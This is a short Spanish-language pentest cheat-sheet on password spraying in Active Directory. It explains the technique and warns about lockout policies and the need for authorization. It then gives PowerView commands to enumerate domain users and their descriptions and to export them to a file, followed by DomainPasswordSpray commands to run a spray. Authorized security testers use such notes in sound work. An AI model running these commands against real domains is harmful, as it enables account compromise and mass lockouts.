# Password Spraying 

Tags: #AD #PasswordSpraying 

```bash 
Es una técnica de autenticación masiva y relativamente intrusiva que consiste en probar 'una misma contraseña común' (ej. 'Winter2025!') contra múltiples cuentas del dominio, en lugar de probar muchas contraseñas contra una sola cuenta. El objetivo es identificar reutilización de credenciales débiles en 'Active Directory'. Aunque es más sigilosa que el brute force tradicional, sigue siendo riesgosa en entornos reales porque interactúa con el mecanismo de bloqueo de cuentas (_Account Lockout Policy_); si se excede el umbral de intentos fallidos, puede provocar bloqueos masivos y generar alertas en los sistemas de monitoreo. Por ello, debe ejecutarse únicamente con autorización formal, controlando ventanas de tiempo, número de intentos y política de lockout.
```

```powershell 
# Utilizar PowerView  
❯ Get-NetUser | select name,description         # Mirar la descripción de los usuarios, a veces hay passwords ahí 
```

```powershell 
# Crear un archivo con los usuarios del dominio para utilizarlo en el ataque de 'Password Spraying'
❯ Get-NetUser | select-Object -ExpandProperty name | Out-File C:\Users\user1\Desktop\users.txt 
```

## DomainPasswordSpray 

* [Password Spraying](https://github.com/dafthack/DomainPasswordSpray)

```bash 
Descargar 'DomainPasswordSpray.ps1' desde el enlace de arriba y pasarlo a la máquina Windows.

Nota:
	- Si aparece un error al momento de cargar la herramienta, comentar la línea que contiene el error, por ejemplo:
		261 # Write-Host "$Message: Waiting for ..." 
```

```powershell 
❯ . .\DomainPasswordSpray.ps1      # Cargar la herramienta 
❯ Invoke-DomainPasswordSpray -UserList .\users.txt -Password "password"      # Ejecutar el password Spraying 
```